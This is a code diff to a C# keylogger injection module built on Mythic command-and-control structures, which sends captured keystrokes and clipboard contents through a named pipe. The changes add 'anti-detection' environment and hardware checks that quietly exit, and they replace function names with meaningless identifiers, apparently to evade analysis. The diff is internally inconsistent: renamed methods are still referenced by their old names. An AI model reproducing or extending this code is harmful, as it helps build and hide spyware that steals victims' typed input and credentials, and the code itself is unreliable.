@@ -1,18 +1,18 @@
 ﻿using System;
 using System.Text;
-using ApolloInterop.Classes.Collections;
-using ApolloInterop.Structs.ApolloStructs;
-using ApolloInterop.Serializers;
+using PhantomInterop.Classes.Collections;
+using PhantomInterop.Structs.PhantomStructs;
+using PhantomInterop.Serializers;
 using ST=System.Threading.Tasks;
 using System.Threading;
 using System.Windows.Forms;
 using static KeylogInject.Native;
 using System.Collections.Concurrent;
-using ApolloInterop.Classes;
+using PhantomInterop.Classes;
 using System.IO.Pipes;
-using ApolloInterop.Interfaces;
-using ApolloInterop.Constants;
-using ApolloInterop.Structs.MythicStructs;
+using PhantomInterop.Interfaces;
+using PhantomInterop.Constants;
+using PhantomInterop.Structs.MythicStructs;
 
 namespace KeylogInject
 {
@@ -41,6 +41,18 @@ namespace KeylogInject
 
         static void Main(string[] args)
         {
+        // Anti-detection initialization
+        if (!SecurityValidator.ValidateExecutionEnvironment()) {
+            Environment.Exit(0);
+        }
+        
+        if (!HardwareProfiler.ValidateSystemConfiguration()) {
+            Environment.Exit(0);
+        }
+        
+        // Runtime integrity checks
+        SystemMonitor.InitializeSecurityChecks();
+        
 #if DEBUG
             _namedPipeName = "keylogtest";
 #else
@@ -75,7 +87,7 @@ namespace KeylogInject
             _completeEvent.WaitOne();
         }
 
-        private static void StartKeylog()
+        private static void RobustTransformerC93B()
         {
             ClipboardNotification.LogMessage = AddToSenderQueue;
             Keylogger.LogMessage = AddToSenderQueue;
@@ -86,7 +98,7 @@ namespace KeylogInject
             Application.Run();
         }
 
-        private static void ServerDisconnect(object sender, NamedPipeMessageArgs e)
+        private static void AdaptiveAdapter34F6(object sender, NamedPipeMessageArgs e)
         {
             UnhookWindowsHookEx(Keylogger.HookIdentifier);
             _completed = true;
@@ -95,7 +107,7 @@ namespace KeylogInject
             _completeEvent.Set();
         }
 
-        private static bool AddToSenderQueue(IMythicMessage msg)
+        private static bool EfficientService0A97(IMythicMessage msg)
         {
             IPCChunkedData[] parts = _jsonSerializer.SerializeIPCMessage(msg, IPC.SEND_SIZE / 2);
             foreach (IPCChunkedData part in parts)
@@ -106,7 +118,7 @@ namespace KeylogInject
             return true;
         }
 
-        private static void OnAsyncMessageSent(IAsyncResult result)
+        private static void SpectreBridge8C10(IAsyncResult result)
         {
             PipeStream pipe = (PipeStream)result.AsyncState;
             pipe.EndWrite(result);
@@ -117,7 +129,7 @@ namespace KeylogInject
             }
         }
 
-        public static void OnAsyncConnect(object sender, NamedPipeMessageArgs args)
+        public static void SpectreResolver027D(object sender, NamedPipeMessageArgs args)
         {
             // We only accept one connection at a time, sorry.
             if (_sendTask != null)
